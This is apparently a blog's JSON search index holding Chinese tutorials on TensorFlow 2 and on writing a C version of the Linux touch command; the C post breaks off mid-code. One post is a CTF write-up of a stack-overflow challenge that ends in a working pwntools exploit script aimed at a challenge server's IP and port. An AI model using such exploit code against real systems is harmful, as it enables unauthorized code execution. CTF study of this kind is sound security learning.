{"meta":{"title":"Mr.red","subtitle":"","description":"Things always start to get better after you give up","author":"Xiao Hong","url":"https://github.com/xiaohong404/xiaohong404.github.io","root":"/xiaohong404.github.io/"},"pages":[{"title":"about","date":"2020-10-15T04:55:40.000Z","updated":"2020-10-15T10:16:30.000Z","comments":true,"path":"about/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/about/index.html","excerpt":"","text":"小红童鞋，请多指教！"},{"title":"tags","date":"2020-10-15T04:55:36.000Z","updated":"2020-10-19T03:50:04.000Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-19T03:31:01.000Z","updated":"2020-10-19T03:50:34.000Z","comments":true,"path":"categories/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"TensorFlow2实现线性回归","slug":"TensorFlow2.0/TensorFlow2实现线性回归","date":"2020-10-27T10:00:13.000Z","updated":"2020-10-27T10:48:36.000Z","comments":true,"path":"2020/10/27/TensorFlow2.0/TensorFlow2实现线性回归/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/","excerpt":"","text":"线性回归是入门机器学习必学的算法，其也是最基础的算法之一。接下来，使用 TensorFlow 2 提供的 API 和 Eager Execution 机制对其进行实现。 线性回归是一种较为简单，但十分重要的机器学习方法，它也是神经网络的基础。如下所示，线性回归要解决的问题就是如何找到最理想的直线去拟合散点样本。 对于一个线性回归问题，一般来讲有 2 种解决方法，分别是：最小二乘法和梯度下降法。其中最小二乘法又分为两种求解思路：代数求解和矩阵求解。本次实验，将使用梯度下降方法来解决线性回归问题。同时，实验将使用 TensorFlow 低阶 API 和高阶 API 两种方法进行实现。 低阶 API 实现TensorFlow 的低阶 API 实现，实际上就是利用最基本的函数和组件，结合 Eager Execution 机制来完成。实验首先初始化一组随机数据样本，并添加噪声，然后将其可视化出来。 在这个过程中，我们全部使用 TensorFlow 提供的 API 来完成，也可以使用numpy数组。 12345678910111213import matplotlib.pyplot as pltimport tensorflow as tfTRUE_W = 3.0TRUE_b = 2.0NUM_SAMPLES = 100# 初始化随机数据X = tf.random.normal(shape=[NUM_SAMPLES, 1]).numpy()noise = tf.random.normal(shape=[NUM_SAMPLES, 1]).numpy()y = X * TRUE_W + TRUE_b + noise # 添加噪声plt.scatter(X, y) 接下来，定义一元线性回归模型： $f(w, b, x) = w*x + b$ 这里我们构建自定义模型类，并使用 TensorFlow 提供的 tf.Variable 随机初始化参数 w 和截距项 b。 1234567class Model(object): def __init__(self): self.W = tf.Variable(tf.random.uniform([1])) # 随机初始化参数 self.b = tf.Variable(tf.random.uniform([1])) def __call__(self, x): return self.W * x + self.b # w*x + b 上方展示了一个标准的 TensorFlow 模型类的构建方法。 对于随机初始化的 w 和 b，我们可以将其拟合直线绘制到样本散点图中。 1234model = Model() # 实例化模型plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) 正常情况下，应该会看到直线并没有很好地拟合样本。示例效果如下（仅参考）： 当然，由于是随机初始化，也有极小概率一开始拟合效果非常好，那么重新执行一次上面的单元格另外随机初始化一组数据即可。尽可能保证一开始随机初始化的直线无法准确拟合数据，方便后续直观感受优化过程的效果。 然后，定义线性回归使用到的损失函数。这里使用线性回归问题中常用的平方损失函数。 ${\\rm Loss}(w, b, x, y) = \\sum_{i=1}^N (f(w, b, x_i) - y_i)^2$ 公式中，f(w,b,$x_i$) 是模型根据 $x_i$ 计算的预测值，*$y_i$* 则表示真实值。 接下来，根据公式实现损失计算函数，同样使用 TensorFlow 中的相关函数。 123def loss_fn(model, x, y): y_ = model(x) return tf.reduce_mean(tf.square(y_ - y)) 接下来，就可以开始迭代过程了，这也是最关键的一步。使用梯度下降法求解线性回归的问题中，我们首先需要计算参数的梯度，然后使用梯度下降法来更新参数。$$\\begin{align}w &amp;\\leftarrow w - lr * \\frac{\\partial {\\rm loss}(w, b)}{\\partial w} \\b &amp;\\leftarrow b - lr * \\frac{\\partial {\\rm loss}(w, b)}{\\partial b}\\end{align}$$公式中，lr 指代学习率。 梯度下降方法是数学中的一种最优化方法，常被用于神经网络的迭代优化过程。简单概括，梯度下降法就是沿着梯度下降方向去寻找损失函数的极小值（梯度的反方向）。过程如下图所示。 TensorFlow 2 中的 Eager Execution 提供了 tf.GradientTape 用于追踪梯度。所以，下面我们对照着参数更新公式来实现梯度下降法的迭代更新过程。 1234567891011EPOCHS = 10 # 全部数据迭代 10 次LEARNING_RATE = 0.1 # 学习率for epoch in range(EPOCHS): # 迭代次数 with tf.GradientTape() as tape: # 追踪梯度 loss = loss_fn(model, X, y) # 计算损失 dW, db = tape.gradient(loss, [model.W, model.b]) # 计算梯度 model.W.assign_sub(LEARNING_RATE * dW) # 更新梯度 model.b.assign_sub(LEARNING_RATE * db) # 输出计算过程 print(f&#x27;Epoch [&#123;epoch&#125;/&#123;EPOCHS&#125;], loss [&#123;loss&#125;], W/b [&#123;model.W.numpy()&#125;/&#123;model.b.numpy()&#125;]&#x27;) 上面的代码中，我们初始化 tf.GradientTape() 以追踪梯度，然后使用 tape.gradient 方法就可以计算梯度了。值得注意的是，tape.gradient() 第二个参数支持以列表形式传入多个参数同时计算梯度。紧接着，使用 .assign_sub 即可完成公式中的减法操作用以更新梯度。 这是一个标准的梯度下降过程,可以看到，损失函数的值随着迭代过程不断减小，意味着我们离最优化参数不断接近。 最终，我们绘制参数学习完成之后，模型的拟合结果。 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) ​ 由于是随机初始化参数，如果迭代后拟合效果仍然不好，一般是迭代次数太少的原因。可以重复执行上面的迭代单元格多次，增加参数更新迭代次数，即可改善拟合效果。 高阶 API 实现TensorFlow 2 中提供了大量的高阶 API 帮助我们快速构建所需模型，接下来，我们使用一些新的 API 来完成线性回归模型的构建。这里还是沿用上面提供的示例数据。 tf.keras 模块下提供的 tf.keras.layers.Dense 全连接层（线性层）实际上就是一个线性计算过程。所以，模型的定义部分就可以直接实例化一个全连接层即可。 12model = tf.keras.layers.Dense(units=1) # 实例化线性层model 其中，units 为输出空间维度。此时，参数已经被初始化了，所以我们可以绘制出拟合直线。 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) 你可以使用 model.variables 打印出模型初始化的随机参数。 1model.variables 接下来就可以直接构建模型迭代过程了。 这里同样使用 tf.GradientTape() 来追踪梯度，我们简化损失计算和更新的过程。首先，损失函数无需再自行构造，我们可以直接使用 TensorFlow 提供的平方损失函数 tf.keras.losses.mean_squared_error 计算，然后使用 tf.reduce_sum 求得全部样本的平均损失。 1234567891011EPOCHS = 10LEARNING_RATE = 0.002for epoch in range(EPOCHS): # 迭代次数 with tf.GradientTape() as tape: # 追踪梯度 y_ = model(X) loss = tf.reduce_sum(tf.keras.losses.mean_squared_error(y, y_)) # 计算损失 grads = tape.gradient(loss, model.variables) # 计算梯度 optimizer = tf.keras.optimizers.SGD(LEARNING_RATE) # 随机梯度下降 optimizer.apply_gradients(zip(grads, model.variables)) # 更新梯度 print(f&#x27;Epoch [&#123;epoch&#125;/&#123;EPOCHS&#125;], loss [&#123;loss&#125;]&#x27;) 其次，使用 model.variables 即可读取可参数的列表，无需像上面那样手动传入参数。这里不再按公式手动更新梯度，而是使用现有的随机梯度下降函数 tf.keras.optimizers.SGD，然后使用 apply_gradients 即可更新梯度。 TensorFlow 中没有提供上方手动实现的梯度下降算法，只提供了随机梯度下降算法。 最终，同样将迭代完成的参数绘制拟合直线到原图中。 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) 一般情况下，应该能看到一个更好的拟合结果。当然，如果拟合效果不好，可能是迭代批次太少，可以重复执行优化过程。 Keras 方式实现配合 TensorFlow 提供的高阶 API，我们省去了定义线性函数，定义损失函数，以及定义优化算法等 3 个步骤。至此，你应该可以初步感受到 TensorFlow 的易用性和存在的必要性了。不过，上面的高阶 API 实现过程实际上还不够精简，我们可以完全使用 TensorFlow Keras API 来实现线性回归。 Keras 本来是一个用 Python 编写的独立高阶神经网络 API，它能够以 TensorFlow, CNTK，或者 Theano 作为后端运行。目前，TensorFlow 已经吸纳 Keras，并组成了 tf.keras 模块。官方介绍，tf.keras 和单独安装的 Keras 略有不同，但考虑到未来的发展趋势，实验以学习 tf.keras 为主。 我们这里使用 Keras 提供的 Sequential 顺序模型结构。和上面的例子相似，向其中添加一个线性层。不同的地方在于，Keras 顺序模型第一层为线性层时，规定需指定输入维度，这里为 input_dim=1。 123model = tf.keras.Sequential() # 新建顺序模型model.add(tf.keras.layers.Dense(units=1, input_dim=1)) # 添加线性层model.summary() # 查看模型结构 接下来，直接使用 .compile 编译模型，指定损失函数为 MSE 平方损失函数，优化器选择 SGD 随机梯度下降。然后，就可以使用 .fit 传入数据开始迭代了。 12model.compile(optimizer=&#x27;sgd&#x27;, loss=&#x27;mse&#x27;) # 定义损失函数和优化方法model.fit(X, y, epochs=10, batch_size=32) # 训练模型 batch_size 是采用小批次训练的参数，主要用于解决一次性传入数据过多无法训练的问题。当然，由于示例数据本身较少，这里意义不大，但还是按照常规使用方法进行设置。 同样，绘制最终的结果： 12plt.scatter(X, y)plt.plot(X, model(X), c=&#x27;r&#x27;) 会发现，完全使用 Keras 高阶 API 实际上只需要 4 行核心代码即可完成，相比于最开始的低阶 API 简化了很多。 1234model = tf.keras.Sequential() # 新建顺序模型model.add(tf.keras.layers.Dense(units=1, input_dim=1)) # 添加线性层model.compile(optimizer=&#x27;sgd&#x27;, loss=&#x27;mse&#x27;) # 定义损失函数和优化方法model.fit(X, y, epochs=10, batch_size=32) # 训练模型","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"forgot","slug":"AD_World/forgot","date":"2020-10-27T06:32:43.000Z","updated":"2020-10-27T08:04:40.000Z","comments":true,"path":"2020/10/27/AD_World/forgot/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/27/AD_World/forgot/","excerpt":"","text":"检查文件开启的保护措施 用IDA32打开 **__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。 shift+F12查看字符串 找到其调用函数的位置 查看sub_80486CC函数所在地址（这里函数名称就对应其地址） 其函数所在地址0x080486CC，注意这里调用system函数需要传递cat flag参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。 基本思路利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。 v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。 即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。 查看其ASCII码对应的字符为： 若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’ 编写python脚本12345678from pwn import *#context.log_level = &#x27;debug&#x27;io = remote(&#x27;220.249.52.133&#x27;,52435)io.sendlineafter(&#x27;&gt; &#x27;,&#x27;xiaohong&#x27;)cat_flag_addr = 0x80486CCpayload = &#x27;/&#x27;*(0x74-0x54)+ p32(cat_flag_addr)io.sendlineafter(&#x27;&gt; &#x27;,payload)io.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"}]},{"title":"导数计算和自动微分实现","slug":"TensorFlow2.0/导数计算和自动微分实现","date":"2020-10-26T10:32:53.000Z","updated":"2020-10-26T10:46:52.000Z","comments":true,"path":"2020/10/26/TensorFlow2.0/导数计算和自动微分实现/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"导数计算Sigmoid 函数是机器学习中会经常看到的一个函数，它是逻辑回归的基础也可以充当神经网络的激活函数。Sigmoid 函数如下所示： $\\mathit{sigmoid}(x) = \\frac{1}{1+e^{-x}}$ 下面使用Tensorflow实现sigmoid函数： 1234import tensorflow as tftf.__version__Out: &#x27;2.1.0&#x27; 123def sigmoid(x): s = 1 / (1 + tf.math.exp(-x)) return s 接下来，使用 TensorFlow 2 提供的方法初始化一组 [−10,10] 之间等间隔的 100 个值，并作为 Sigmoid 函数的输入。最终，使用 Matplotlib 绘制出 Sigmoid 函数的曲线。同样，使用 TensorFlow 2 提供的相关方法。 12345from matplotlib import pyplot as plt%matplotlib inlinex = tf.linspace(-10.0, 10.0, 100)plt.plot(x, sigmoid(x)) 接下来，对 Sigmoid 函数求导，并实现 Sigmoid 导数函数 sigmoid_derivative(x)： 123def sigmoid_derivative(x): d_s = sigmoid(x) * (1 - sigmoid(x)) return d_s 同样，使用上面初始化好的 x 值，绘制 Sigmoid 函数导数的变化曲线。 1plt.plot(x, sigmoid_derivative(x)) 自动微分TensorFlow 中，可以使用 tf.GradientTape 跟踪全部运算过程，以便在必要的时候计算梯度。当然，对于上方 Sigmoid 一元函数而言，也就是自动求导过程。 接下来，使用在实验中学习到的方法，使用 tf.GradientTape 完成自动微分。同样，需要传入前面生成的等间距 x 并绘制出导数的变化曲线。提示，在计算梯度的过程中，x 可能需要被转换为变量张量。 12345678x = tf.Variable(x)with tf.GradientTape() as tape: # 追踪梯度 s = 1 / (1 + tf.math.exp(-x))grad = tape.gradient(s, x) # 计算梯度grad 1plt.plot(x.numpy(), grad.numpy()) # 绘制 sigmoid 导数变化曲线 可以发现，借助于自动微分机制，我们只需要书写计算过程即可得到关于任意变量的微分结果。","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"TensorFlow2基础概念语法","slug":"TensorFlow2.0/TensorFlow2基础概念语法","date":"2020-10-26T09:41:24.000Z","updated":"2020-10-26T10:20:26.000Z","comments":true,"path":"2020/10/26/TensorFlow2.0/TensorFlow2基础概念语法/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/","excerpt":"","text":"张量数学或物理上关于张量的两种定义方法（抽象）： 通常定义张量的物理学或传统数学方法，是把张量看成一个多维数组，当变换坐标或变换基底时，其分量会按照一定规则进行变换，这些规则有两种：即协变或逆变转换。 通常现代数学中的方法，是把张量定义成某个矢量空间或其对偶空间上的多重线性映射，这矢量空间在需要引入基底之前不固定任何坐标系统。例如协变矢量，可以描述为 1-形式，或者作为逆变矢量的对偶空间的元素。 通俗来讲，一阶张量为向量，二阶张量为矩阵。当然，零阶张量也就是标量，而更重要的是 𝑁 阶张量，也就是 𝑁 维数组。 阶 数学实例 0 标量（只有大小） 1 矢量（大小和方向） 2 矩阵（数据表） 3 3 阶张量（数据立体） N N 阶张量（自行想象） 大多数深度学习框架都会使用张量的概念，这样做的好处是统一对数据的定义。NumPy 中，数据都使用 Ndarray 多维数组进行定义，TensorFlow 中，数据都会用张量进行表述。 下面就来学习 TensorFlow 中对张量的定义。在 TensorFlow 中，每一个 Tensor 都具备两个基础属性：数据类型（默认：float32）和形状。 其中，数据类型大致如下表所示： Tensor 类型 描述 tf.float32 32 位浮点数 tf.float64 64 位浮点数 tf.int64 64 位有符号整型 tf.int32 32 位有符号整型 tf.int16 16 位有符号整型 tf.int8 8 位有符号整型 tf.uint8 8 位无符号整型 tf.string 可变长度的字节数组 tf.bool 布尔型 tf.complex64 实数和虚数 另外，TensorFlow 通过三种符号约定来描述张量维度：阶，形状和维数。三者之间的关系如下： 形状 阶 维数 示例 [] 0 0-D 0 维张量，标量。 [D0] 1 1-D 形状为 [5] 的 1 维张量。 [D0, D1] 2 2-D 形状为 [3, 4] 的 2 维张量。 [D0, D1, D2] 3 3-D 形状为 [1, 4, 3] 的 3 维张量。 [D0, D1, … Dn-1] n n-D 形状为 [D0, D1, … Dn-1] 的张量。 值得注意的是，上表中的示例都是形容张量的形状。例如 [3, 4] 指的张量的形状为 [3, 4]，而不是张量 [3, 4]。 根据不同的用途，TensorFlow 中主要有 2 种张量类型，分别是： tf.Variable ：变量 Tensor，需要指定初始值，常用于定义可变参数，例如神经网络的权重。 tf.constant ：常量 Tensor，需要指定初始值，定义不变化的张量。 我们可以通过传入列表或 NumPy 数组来新建变量和常量类型的张量： 查看tensorflow版本 1234import tensorflow as tftf.__version__Out: &#x27;2.1.0&#x27; 输入形状为 (2, 2) 的二维变量 123456v = tf.Variable([[1, 2], [3, 4]]) # 形状为 (2, 2) 的二维变量vOut: &lt;tf.Variable &#x27;Variable:0&#x27; shape=(2, 2) dtype=int32, numpy= array([[1, 2], [3, 4]], dtype=int32)&gt; 输入形状为 (2, 2) 的二维常量 123456c = tf.constant([[1, 2], [3, 4]]) # 形状为 (2, 2) 的二维常量cOut: &lt;tf.Tensor: shape=(2, 2), dtype=int32, numpy= array([[1, 2], [3, 4]], dtype=int32)&gt; 输出包含了张量的 3 部分属性，分别是形状 shape，数据类型 dtype，以及对应的 NumPy 数组。 还可以直接通过 .numpy() 输出张量的 NumPy 数组： 1234c.numpy()Out: array([[1, 2], [3, 4]], dtype=int32) 下面列举几个经常会用到的新建特殊常量张量的方法： tf.zeros：新建指定形状且全为 0 的常量 Tensor tf.zeros_like：参考某种形状，新建全为 0 的常量 Tensor tf.ones：新建指定形状且全为 1 的常量 Tensor tf.ones_like：参考某种形状，新建全为 1 的常量 Tensor tf.fill：新建一个指定形状且全为某个标量值的常量 Tensor 3x3 全为 0 的常量 Tensor 1234567c = tf.zeros([3, 3]) # 3x3 全为 0 的常量 TensorcOut: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], dtype=float32)&gt; 与 c 形状一致全为 1 的常量 Tensor 123456tf.ones_like(c) # 与 c 形状一致全为 1 的常量 TensorOut: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.]], dtype=float32)&gt; 2x3 全为 6 的常量 Tensor 12345tf.fill([2, 3], 6) # 2x3 全为 6 的常量 TensorOut: &lt;tf.Tensor: shape=(2, 3), dtype=int32, numpy= array([[6, 6, 6], [6, 6, 6]], dtype=int32)&gt; 除此之外，还可以创建一些序列: tf.linspace：创建一个等间隔序列。 tf.range：创建一个数字序列。 123tf.linspace(1.0, 10.0, 5, name=&quot;linspace&quot;)Out: &lt;tf.Tensor: shape=(5,), dtype=float32, numpy=array([ 1. , 3.25, 5.5 , 7.75, 10. ], dtype=float32)&gt; 123tf.range(start=1, limit=10, delta=2)Out: &lt;tf.Tensor: shape=(5,), dtype=int32, numpy=array([1, 3, 5, 7, 9], dtype=int32)&gt; Eager ExecutionTensorFlow 2 带来的最大改变之一是将 1.x 的 Graph Execution（图与会话机制）更改为 Eager Execution（动态图机制）。在 1.x 版本中，低级别 TensorFlow API 首先需要定义数据流图，然后再创建 TensorFlow 会话，这一点在 2.0 中被完全舍弃。TensorFlow 2 中的 Eager Execution 是一种命令式编程环境，可立即评估操作，无需构建图。 所以说，TensorFlow 的张量运算过程可以像 NumPy 一样直观且自然了。接下来，我们以最简单的加法运算为例： 123456c + c # 加法计算Out: &lt;tf.Tensor: shape=(3, 3), dtype=float32, numpy= array([[0., 0., 0.], [0., 0., 0.], [0., 0., 0.]], dtype=float32)&gt; 1.x 版本的 TensorFlow，一个加法运算过程十分复杂。我们需要初始化全局变量 → 建立会话 → 执行计算，最终才能打印出张量的运算结果。 1234init_op = tf.global_variables_initializer() # 初始化全局变量with tf.Session() as sess: # 启动会话 sess.run(init_op) print(sess.run(c + c)) # 执行计算 Eager Execution 带来的好处显而易见，其进一步降低了 TensorFlow 的入门门槛。之前的 Graph Execution 模式，实际上让很多人在入门时都很郁闷，因为完全不符合正常思维习惯。 TensorFlow 中提供的数学计算，包括线性代数计算方面的方法也是应有尽有，十分丰富。下面，我们再列举几个示例: 矩阵乘法： 123456789a = tf.constant([1., 2., 3., 4., 5., 6.], shape=[2, 3])b = tf.constant([7., 8., 9., 10., 11., 12.], shape=[3, 2])c = tf.linalg.matmul(a, b) # 矩阵乘法cOut: &lt;tf.Tensor: shape=(2, 2), dtype=float32, numpy= array([[ 58., 64.], [139., 154.]], dtype=float32)&gt; 转置矩阵： 12345tf.linalg.matrix_transpose(c) # 转置矩阵Out: &lt;tf.Tensor: shape=(2, 2), dtype=float32, numpy= array([[ 58., 139.], [ 64., 154.]], dtype=float32)&gt; 可以把 TensorFlow 理解成为 TensorFlow 式的 NumPy + 为搭建神经网络而生的 API 自动微分在数学中，微分是对函数的局部变化率的一种线性描述。虽然微分和导数是两个不同的概念。但是，对一元函数来说，可微与可导是完全等价的。如果熟悉神经网络的搭建过程，应该明白梯度的重要性。而对于复杂函数的微分过程是极其麻烦的，为了提高应用效率，大部分深度学习框架都有自动微分机制。 TensorFlow 中，可以使用 tf.GradientTape 跟踪全部运算过程，以便在必要的时候计算梯度。 123456789w = tf.Variable([1.0]) # 新建张量with tf.GradientTape() as tape: # 追踪梯度 loss = w * wgrad = tape.gradient(loss, w) # 计算梯度gradOut: &lt;tf.Tensor: shape=(1,), dtype=float32, numpy=array([2.], dtype=float32)&gt; 上面演示了一个自动微分过程，它的数学求导过程如下： $$ loss = w^2 \\rightarrow \\frac {\\partial loss}{\\partial w} = 2w $$ 所以，当 w 等于 1 时，计算结果为 2。 tf.GradientTape 会像磁带一样记录下计算图中的梯度信息，然后使用 .gradient 即可回溯计算出任意梯度，这对于使用 TensorFlow 低阶 API 构建神经网络时更新参数非常重要。 常用模块上面已经学习了 TensorFlow 核心知识，接下来将对 TensorFlow API 中的常用模块进行简单的功能介绍。对于框架的使用，实际上就是灵活运用各种封装好的类和函数。由于 TensorFlow API 数量太多，迭代太快，所以要养成随时 查阅官方文档 的习惯。 tf.：包含了张量定义，变换等常用函数和类。 tf.data：输入数据处理模块，提供了像 tf.data.Dataset 等类用于封装输入数据，指定批量大小等。 tf.image：图像处理模块，提供了像图像裁剪，变换，编码，解码等类。 tf.keras：原 Keras 框架高阶 API。包含原 tf.layers 中高阶神经网络层。 tf.linalg：线性代数模块，提供了大量线性代数计算方法和类。 tf.losses：损失函数模块，用于方便神经网络定义损失函数。 tf.math：数学计算模块，提供了大量数学计算函数。 tf.saved_model：模型保存模块，可用于模型的保存和恢复。 tf.train：提供用于训练的组件，例如优化器，学习率衰减策略等。 tf.nn：提供用于构建神经网络的底层函数，以帮助实现深度神经网络各类功能层。 tf.estimator：高阶 API，提供了预创建的 Estimator 或自定义组件。 在构建深度神经网络时，TensorFlow 可以说提供了你一切想要的组件，从不同形状的张量、激活函数、神经网络层，到优化器、数据集等，一应俱全。","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"}]},{"title":"C语言实现Linux-touch命令","slug":"C/C语言实现Linux-touch命令","date":"2020-10-25T01:10:55.000Z","updated":"2020-10-27T08:05:50.000Z","comments":true,"path":"2020/10/25/C/C语言实现Linux-touch命令/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/25/C/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Linux-touch%E5%91%BD%E4%BB%A4/","excerpt":"","text":"实验介绍1.实验简介Linux 的 touch 命令用来修改文件时间戳，或者新建一个不存在的文件，使用方式如下： 1touch [-acm][-r ref_file(参照文件)|-t time(时间值)] file(文件名) c 本实验基于 C 语言实现 Linux touch 命令的 [-acm] 选项。 注: touch file1.txt 更新 file1.txt 的存取和修改时间touch -a file1.txt 改变 file1.txt 的读取时间记录touch -c file1.txt 如果 file1.txt 不存在，不创建文件touch -m file1.txt 改变 file1.txt 的修改时间记录 2. 知识点 函数 getopt UNIX 系统函数 open 函数 utimensat 3. 实验环境 Xfce终端 GCC Gedit 实验步骤我们要实现一个命令，我们最好先来了解它是干嘛用的以及怎么用的，因此，我们从使用者的角度来了解一下 touch 命令的用处及用法： 1man touch 从 man touch 的输出来看，该命令的用处就是，修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。基本用法，可以不带任何参数直接执行 touch filename，如下： 接下来，我们将分步骤从完成整个程序的运行。 背景知识知识点1：getopt函数函数 getopt 是专门解决参数处理的函数。包含在头文件 #include &lt;unistd.h&gt;。一般形式如下： 1int getopt(int argc,char * const argv[ ],const char * optstring); 作用： 分析命令行参数。 返回值：参数字符。 知识点2：open函数函数 open 是 UNIX 系统的系统调用函数，区别于 C 语言库函数 fopen。包含在头文件 #include &lt;fcntl.h&gt;，一般形式如下： 12int open(constchar*pathname, int flags); int open(constchar*pathname, int flags, mode_t mode); 作用：打开和创建文件。返回值：成功则返回文件描述符，否则返回 -1。 参数说明： 对于 open 函数来说，第三个参数仅当创建新文件时（即使用了 O_CREAT 时）才使用，用于指定文件的访问权限位（access permission bits）。pathname 是待打开/创建文件的 POSIX 路径（如/home/user/a.cpp）；flags 用于指定文件的打开/创建模式，这个参数可由以下常量（定义于fcntl.h）通过逻辑位或逻辑构成。 123O_RDONLY 只读模式O_WRONLY 只写模式O_RDWR 读写模式 参数 mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到 umask 值所影响, 因此该文件权限应该为 (mode-umaks). S_IRWXU 00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.S_IROTH 00004 权限, 代表其他用户具有可读的权限S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.S_IXOTH 00001 权限, 代表其他用户具有可执行的权限. 知识点3：utimensat函数 函数 utimensat 以纳秒级的精度改变文件的时间戳。包含在 #include &lt;sys/stat.h&gt;，一般形式如下： 1int utimensat(int dirfd, const char *pathname,const struct timespec times[2], intflags); 作用：utimensat 是以纳秒级的精度改变文件的时间戳。utimensat() 通过文件的路径（pathname）获得文件。 这个系统调用函数都是通过一个时间数组 times 来改变时间戳的，times[0] 修改最后一次访问的时间(access time)，times[1] 修改最后修改的时间 (modify time)。该时间数组是由秒和纳秒两个部分组成，数据结构如下： 1234struct timespec &#123;time_t tv_sec; /* 秒 */ long tv_nsec; /* 纳秒 */&#125;; 特别注意： 当 times[x].tv_sec = UTIME_OMIT; 相应的时间戳不变，times[x].tv_sec = UTIME_NOW; 相应的时间戳编程当前时间 接下来我们开始编写 mytouch.c 源程序，将分为两步完成。第一步是 main 函数，第二步是 mytouch 子函数。注意这是一个程序，只有一个 .c 文件。 设计main函数main 完成的工作是从命令行接收参数，并解析选项，设置相应的标志变量，然后调用 mytouch 函数。main 函数中两个参数是用来接收命令行传进来的参数 int argc, char **argv。 从命令行中得到命令的选项，即以’-‘开头的参数。目前只支持三种选型 -a, -c, -m，则需给 getopt 传参”acm”即可。代码如下： 1while ((c = getopt(argc, argv, &quot;acm&quot;)) != -1) 编写源程序 mytouch.c： 预处理功能及 main 函数代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include 